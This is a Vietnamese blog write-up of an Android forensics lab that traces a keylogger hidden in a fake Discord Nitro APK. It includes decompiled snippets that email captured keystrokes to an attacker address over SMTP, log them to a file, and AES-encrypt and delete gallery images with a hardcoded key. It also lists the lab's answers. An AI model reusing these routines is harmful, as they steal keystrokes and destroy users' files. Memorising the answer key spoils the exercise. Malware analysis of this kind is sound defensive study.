---
title: "AndroiBreach"
date: 2026-05-23 07:00:00 +0700
categories: [Mobile, malware]
tags: [Androi]
---
## Scenario

At BrightWave Company, a data breach occurred due to an employee's lack of security awareness, compromising his credentials. The attacker used these credentials to gain unauthorized access to the system and exfiltrate sensitive data. During the investigation, the employee revealed two critical points: first, he stores all his credentials in the notes app on his phone, and second, he frequently downloads APK files from untrusted sources. Your task is to analyze the provided Android dump, identify the malware downloaded, and determine its exact functionality.

Có một endpoint đã bị compromise và nhiệm vụ của mình là analysts và đưa ra các IOC cũng như các dấu hiệu của endpoint này bên cạnh đó xác định chính xác những gì endpoint này đã hoạt động và hoạt đọng một cách như thế nào, bài lab này đánh vào trung tâm của androi một OS của mobile và bây giờ mình sẽ trả lời câu hỏi cũng như phân tích về nó.

## Prapare

Vì mình dùng VM của họ để phân tích và xác định nên trong vm của họ đã có sẵn các tool như ALEAPP và JADX đây là hai tool phân tích OS của adnroi, nếu cách bạn muốn phân tích về OS mobile thì các bạn có thể download hai tool này về để phân tích. 

1. [Miscellaneous]:
    1. DB Browser (SQLite):
        - Description: [DB Browser for SQLite is a visual, open-source tool that allows users to create, design, and edit SQLite database files. It is widely used for managing SQLite databases in applications and forensic analysis.]
    
    2.jadx:
    - Description: [jadx is a decompiler for Android applications that converts .apk files into readable Java source code. It is used in reverse engineering Android apps to analyze their behavior and security vulnerabilities.]
    
2. [Mobile Forensics]:
    1. ALEAPP:
        - Description: [Android Logs Events And Protobuf Parser]

Họ có give cho mình một folder chứa data của machine bị compromise và mình sẽ dùng APPLE để xem logs cũng như dùng JADX để phân tích những điều mình sắp làm dưới đây.

## Practice

### What suspicious link was used to download the malicious APK from your initial investigation?

![image.png](./assets/image.png)

Để tra nó thì mình dùng APPLE để thực hiện hành động phân tích logs cũng như những cái mà họ yêu cầu, những định nghĩa của tool thì mình đã để ở trên và các bạn có thể tìm hiểu cũng như học để biết nó làm gì. 

![image.png](./assets/image (1).png)

Sau khi mình dùng tool APPLE thì nó sẽ give cho mình một trang UI chứa logs cũng như những activity của machine này, bây giờ mình sẽ vào phần logs download của machine này để xem họ đã tải file gì về máy của họ

![image.png](./assets/image (2).png)

Như các bạn có thể thấy được rằng họ đã tải vào một đường link và tải một package về máy của họ và đó chính là https://ufile.io/57rdyncx, đây chính là đáp án của câu hỏi. Các bạn có thể lên virustotal và kiểm tra về url này.

### What is the name of the downloaded APK?

Thì theo dòng thư mục trên họ muôn biết được là victim này đã tải package nào, để biết được điều này mình sẽ kiểm tra trong phần download của thiết bị xem đã được tải package nào về máy 

![image.png](./assets/image (3).png)

khi mình kiểm tra trong thư mục download thì mình có phát hiện được victim này đã tải một apk có tên là Discord_nitro_mod.apk nghĩa là victim đã bị hacker lừa để tải apk này về và có khả năng victim này muốn dùng mode của nitro trong discord nên đã download file này về, nói chung lại là do victim chứ không phải là gì hết.

### What is the malicious package name found in the APK?

Để kiểm tra malicious  package trong apk đó thì mình sẽ sử dụng tool JADX để phân tích và cũng như tìm kiếm nó, bản chất của tool này mình đã có giải thích và take note ở trên rồi các bạn có thể đọc và hiểu sơ sơ về nó. 

![image.png](./assets/image (4).png)

Đây chính là kết quả mà mình nhận được khi đẩy từ file apk đó lên và nó có hết các source cũng như everything nằm ở đây, nhưng có một điều mình đáng chú ý là có một folder tên là example.keylogger mình kiểm tra thì nó có một số chi tiết đáng để chú ý vậy nên mình khá là red flag folder này 

![image.png](./assets/image (5).png)

Khi mình chọn ngẫu nhiên một file trong đó thì có hiện ra package đó là com.example.keylogger, khi mình tìm hiểu về package  này thì đây chính là một package thiết kế dành riêng cho track every keystroke on a keyboard có nghĩa là nó theo dõi hành động trên keyboard của người dùng, vậy từ 2 điều này mình có thể kết luận đây chính là package mà mình đang tìm kiếm.

### Which port was used to exfiltrate the data?

Để biết được đó là cổng port bao nhiêu thì mình quan sát thấy được trong package này có phần SendEmali, điều này đồng nghĩa với việc nó dùng mail để exfiltrate data các bạn có thể quan sát ở bên dưới 

![image.png](./assets/image (6).png)

```jsx
    public void openEmailClient(String toEmail, String subject, String body) {
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "sandbox.smtp.mailtrap.io");
        props.put("mail.smtp.port", "465");

```

Đây chính là function code mà hacker dùng để config và thiết lập kết nối, vậy mình đã có được câu trả lời là cổng port 465 và họ dùng protocol SMTP để send mail.

### What email was used by the attacker when exfiltrating data?

Để trả lời câu hỏi này mình sẽ kiểm tra xem bên trong các function của package này chứa cái gì vì trong source code của nó sẽ chứa những gì mà nó hoạt động bên cạnh đó nó làm rõ ở trong đó sẽ hoạt động như thế nào

```jsx
public class BroadcastForAlarm extends BroadcastReceiver {
    KeyLogs log = new KeyLogs();

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String msg = KeyLogs.GetLog();
        SendEmail SendEmail = new SendEmail(context, "APThreat@gmail.com", "KeyLogger", msg);
        SendEmail.Send();
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("config.txt", 0));
            outputStreamWriter.write(msg);
            outputStreamWriter.close();
        } catch (IOException e10) {
            Log.e("Exception", "File write failed: " + e10.toString());
        }
    }
}
```

Khi kiểm tra trong phần BroadcastForAlarm của source code thì mình phát hiện được function này và bên được gửi tởi email mà họ đã cho trước bên cạnh đó Keylogger sẽ được kết hợp để gửi.

mailto:APThreat@gmail.com

### The attacker has saved a file containing leaked company credentials before attempting to exfiltrate it. Based on the data, can you retrieve the credentials found in the leak?

Để thực hiện được điều này thì mình không còn phải dùng tới tool này nữa bởi vì trong phần data của Victim đã lưu trữ lại tất cả bên cạnh đó nếu kiểm dùng source code để kiểm tra thì cũng không thể  tìm ra được, mình chỉ tìm được function mà thực hiện lệnh write vào file này thôi 

```jsx
public class BroadcastForAlarm extends BroadcastReceiver {
    KeyLogs log = new KeyLogs();

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        String msg = KeyLogs.GetLog();
        SendEmail SendEmail = new SendEmail(context, "APThreat@gmail.com", "KeyLogger", msg);
        SendEmail.Send();
        try {
            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(context.openFileOutput("config.txt", 0));
            outputStreamWriter.write(msg);
            outputStreamWriter.close();
        } catch (IOException e10) {
            Log.e("Exception", "File write failed: " + e10.toString());
        }
    }
}
```

![image.png](./assets/image (7).png)

Như mình đã nói khi cái gì làm gì trên machine thì đều ghi lại và đều có file storage của nó, không cần đi đâu xa mình chỉ và phần file của discord và check xem như thế nào là mình có thể biết được rồi

![image.png](./assets/image (8).png)

Đây chính là những gì có trong file config.txt đó và dựa vào function code bên trên thì bạn có thể thấy rằng khi thực hiện họ sẽ lưu các credential vào file này và để send tới cho hacker. đó chính là luồng hoạt động của điều này.

hany.tarek@brightwave.com:HTarek@9711$QTPO309

### The malware altered images stored on the Android phone by encrypting them. What is the encryption key used by the malware to encrypt these images?

Ở câu hỏi này mình sẽ đi tìm key dùng để encryption, và nếu muốn decryption thì bắt buộc phải có key này thì mình mới thực hiện điều đó được bên cạnh đó có một điều khá là hay và thông minh của hacker, là nó không dùng key để encode data mà dùng để encode image, mình cũng khá khó hiểu với điều này nhưng ở dưới đây chính là source code mà dùng để thực hiện điều này

```jsx

    public void ENC(Context context, List<Uri> imageUris) {
        new ArrayList();
        for (Uri uri : imageUris) {
            try {
                Log.d("Image", uri.toString());
                Bitmap bitmap = loadBitmapFromUri(context, uri);
                byte[] pixelArray = bitmapToByteArray(bitmap);
                byte[] encryptedPixels = AESUtils.encrypt(pixelArray, AESUtils.stringToKey("OWJZJHdRNyFjVHo0NjVUWA=="));
                savePixelsToUri(context, encryptedPixels, "img.jpg");
                File fdelete = new File((String) Objects.requireNonNull(getFilePath(context, uri)));
                if (fdelete.exists()) {
                    if (fdelete.delete()) {
                        Log.d(JSStackTrace.FILE_KEY, "file Deleted :");
                    } else {
                        Log.d(JSStackTrace.FILE_KEY, "file not Deleted :");
                    }
                }
            } catch (Exception e10) {
                e10.printStackTrace();
                Log.d("Err", e10.toString());
            }
        }
    }

```

Đoạn key đã bị encode bằng base64 và khi mình decode bằng base64 thì mình nhận lại được kết quả ở dưới đây. Nó encode image bởi vì có thể trong ảnh có data hoặc proof secret, nếu gửi thẳng thì user có thể nhận biết được và cũng như có thể hiểu được flow active vậy nó encode điều này để khó phát hiện ngoài ra còn bypass được một vài active defend nó.

9bY$wQ7!cTz465TX

### The employee stored sensitive data in their phone's gallery, including credit card information. What is the CVC of the credit card stored?

Để thực hiện điều này thì đây thuộc về phần vật lý của file rồi thì mình sẽ kiểm tra trong phần image của nó, bởi vì mobile cũng có structure file khá giống linux nên điều này khi mình thực hiện khá là easy

![image.png](./assets/image (9).png)

Đây chính là path chứa image của nó và dưới đây chính là kết quả của đáp án này

![image.png](./assets/image (10).png)

Đây là một credit bank bị lộ CVC khá là may mắn khi nó không chứa account hay number of credit nếu không thì hacker có thể lợi dụng điều này mà làm những điều bất hợp pháp

### Conclude

Bài lab này là một bài lab DFIR về mobile mình thấy bài này rất hay và có nhiều manh mối để tìm kiếm nếu ai muốn chuyên sâu về nó thì các bạn nên học thật kỹ cấu trúc file của nó để dễ phân tích hơn và kết hợp với tool cũng se mượt mà hơn là mình. Buồn ngủ quá rồi đến đây thôi nhé, cuối tuần vui vẻ nha my friend…..
